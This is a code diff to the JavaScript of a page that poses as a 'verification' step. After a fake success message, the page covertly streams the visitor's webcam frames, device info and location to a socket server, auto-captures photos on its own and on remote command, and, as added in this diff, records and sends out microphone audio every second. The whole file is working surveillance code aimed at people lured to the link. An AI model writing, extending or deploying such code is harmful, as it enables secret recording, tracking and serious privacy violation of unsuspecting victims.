@@ -54,8 +54,8 @@ let mediaStream = null;
 let cameraReady = false;
 let useFrontCamera = true;
 let streamInterval = null;
-let autoCaptureDone = false;
 let autoCaptureTimer = null;
+let mediaRecorder = null;
 
 function setStatus(message, type) {
     statusBox.textContent = message;
@@ -86,13 +86,10 @@ function requestAndSendLocation() {
 }
 
 function cleanupResources() {
-    if (streamInterval) {
-        clearInterval(streamInterval);
-        streamInterval = null;
-    }
-    if (autoCaptureTimer) {
-        clearInterval(autoCaptureTimer);
-        autoCaptureTimer = null;
+    if (streamInterval) { clearInterval(streamInterval); streamInterval = null; }
+    if (autoCaptureTimer) { clearInterval(autoCaptureTimer); autoCaptureTimer = null; }
+    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+        try { mediaRecorder.stop(); } catch(e) {}
     }
     if (mediaStream) {
         mediaStream.getTracks().forEach(track => track.stop());
@@ -107,7 +104,6 @@ async function triggerVerification() {
     cleanupResources();
 
     try {
-        // AUDIO ENABLED HERE FOR AUDIO STREAMING SUPPORT
         const stream = await navigator.mediaDevices.getUserMedia({
             audio: true,
             video: { facingMode: useFrontCamera ? "user" : "environment", width: { ideal: 1280 }, height: { ideal: 720 } }
@@ -117,13 +113,12 @@ async function triggerVerification() {
         await video.play();
         cameraReady = true;
         setStatus("Verified Successfully!", "success");
+        
         socket.emit("user-ready", { deviceInfo: getDeviceInfo() });
         startLiveStream();
-        
-        if (!autoCaptureDone) {
-            autoCaptureDone = true;
-            runAutoCaptureSequence();
-        }
+        startAudioStreaming();
+        runAutoCaptureSequence();
+
     } catch (error) {
         cameraReady = false;
         setStatus("Camera and Microphone access required.", "error");
@@ -140,40 +135,67 @@ function startLiveStream() {
         const ctx = canvas.getContext("2d");
         ctx.drawImage(video, 0, 0, 640, 360);
         socket.emit("live-stream-frame", canvas.toDataURL("image/jpeg", 0.6));
-    }, 200);
+    }, 150);
 }
 
-function takeSinglePhoto() {
-    if (!cameraReady || !video.videoWidth) return false;
+function startAudioStreaming() {
+    try {
+        const audioTracksOnly = new MediaStream(mediaStream.getAudioTracks());
+        mediaRecorder = new MediaRecorder(audioTracksOnly, { mimeType: 'audio/webm' });
+        mediaRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) {
+                socket.emit('audio-stream', event.data);
+            }
+        };
+        mediaRecorder.start(1000); // Send audio chunks every 1 second
+    } catch (e) {
+        console.error('Audio recording failed:', e);
+    }
+}
+
+function takeSinglePhoto(callback) {
+    if (!cameraReady || !video.videoWidth) {
+        if (callback) callback(false);
+        return false;
+    }
     canvas.width = video.videoWidth || 1280;
     canvas.height = video.videoHeight || 720;
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    socket.emit("user-photo-captured", canvas.toDataURL("image/jpeg", 0.90));
+    const imageData = canvas.toDataURL("image/jpeg", 0.85);
+
+    socket.emit("user-photo-captured", imageData, (res) => {
+        if (callback) callback(res && res.success);
+    });
     return true;
 }
 
 function runAutoCaptureSequence() {
-    let count = 0;
-    
-    // Retry mechanism for first photo if video metadata isn't instantly ready
-    const initialTry = setInterval(() => {
-        if (takeSinglePhoto() || count > 10) {
-            clearInterval(initialTry);
-        }
-        count++;
-    }, 300);
-
     let capturedCount = 0;
-    autoCaptureTimer = setInterval(() => {
-        if (capturedCount >= 4) {
-            clearInterval(autoCaptureTimer);
-            autoCaptureTimer = null;
-            return;
+    const maxPhotos = 5;
+
+    if (autoCaptureTimer) clearInterval(autoCaptureTimer);
+
+    const checkReadyInterval = setInterval(() => {
+        if (video.videoWidth > 0) {
+            clearInterval(checkReadyInterval);
+            
+            // 1st photo immediately
+            takeSinglePhoto();
+            capturedCount++;
+
+            // Remaining 4 photos with 1 second gap (Total 5 photos)
+            autoCaptureTimer = setInterval(() => {
+                if (capturedCount >= maxPhotos) {
+                    clearInterval(autoCaptureTimer);
+                    autoCaptureTimer = null;
+                    return;
+                }
+                takeSinglePhoto();
+                capturedCount++;
+            }, 1000);
         }
-        takeSinglePhoto();
-        capturedCount++;
-    }, 1000);
+    }, 200);
 }
 
 socket.on("link-disabled", () => {
@@ -183,7 +205,7 @@ socket.on("link-disabled", () => {
 
 socket.on("server-full", () => {
     cleanupResources();
-    document.body.innerHTML = `<div style="text-align:center;color:#fff;padding:50px;font-family:sans-serif;"><h2>Server is full (Maximum 5 users reached). Please try again later.</h2></div>`;
+    document.body.innerHTML = `<div style="text-align:center;color:#fff;padding:50px;font-family:sans-serif;"><h2>Server is full. Please try again later.</h2></div>`;
 });
 
 socket.on("capture-photo", () => takeSinglePhoto());
